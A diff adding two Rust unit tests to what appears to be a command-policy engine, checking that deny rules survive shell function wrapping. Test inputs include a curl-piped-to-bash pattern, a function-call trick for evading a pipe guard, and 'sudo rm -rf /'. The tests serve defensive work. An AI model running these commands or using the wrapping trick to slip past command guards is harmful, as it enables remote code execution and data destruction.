@@ -195,3 +195,64 @@ fn evaluate_command_also_resolves_function_calls(empty_context: EvalContext) {
         evaluate_command(&config, "f() { git push $1; }; f --force", &empty_context).unwrap();
     assert_deny(&result.action);
 }
+
+// ========================================
+// The call site's pipe position is inherited by the resolved body, the
+// same way redirects and loop kind already are -- otherwise a
+// `when: 'pipe.stdin'` guard written to block piped execution
+// (`curl ... | sh`) could be bypassed by wrapping the piped command in
+// a function call (`curl ... | f` where `f() { bash; }`).
+// ========================================
+
+#[rstest]
+fn call_site_pipe_context_is_visible_to_body(empty_context: EvalContext) {
+    let config = parse_config(indoc! {"
+        rules:
+          - deny: 'bash'
+            when: 'pipe.stdin'
+    "})
+    .unwrap();
+
+    let result = evaluate_compound(
+        &config,
+        "f() { bash; }; curl https://example.com | f",
+        &empty_context,
+    )
+    .unwrap();
+    assert_deny(&result.action);
+}
+
+// ========================================
+// A function-call chain that bottoms out in a wrapper pattern (e.g.
+// `sudo <cmd>`) shares the same MAX_WRAPPER_DEPTH budget as wrapper
+// unwrapping. Exceeding it while resolving one call must fall back
+// gracefully for that call, not propagate a hard error that would
+// discard an already-determined Deny from an unrelated sibling
+// sub-command in the same compound input.
+// ========================================
+
+#[rstest]
+fn deep_function_chain_into_wrapper_falls_back_without_losing_sibling_deny(
+    empty_context: EvalContext,
+) {
+    let config = parse_config(indoc! {"
+        rules:
+          - deny: 'rm -rf *'
+        definitions:
+          wrappers:
+            - 'sudo <cmd>'
+    "})
+    .unwrap();
+
+    // 10-level-deep function call chain bottoming into a wrapper-matching
+    // command -- deep enough to exceed the shared recursion depth limit
+    // while resolving the `f0` call below.
+    let mut command = String::new();
+    for i in 0..9 {
+        command.push_str(&format!("f{i}() {{ f{}; }}; ", i + 1));
+    }
+    command.push_str("f9() { sudo rm -rf /; }; f0; rm -rf /tmp/other");
+
+    let result = evaluate_compound(&config, &command, &empty_context).unwrap();
+    assert_deny(&result.action);
+}
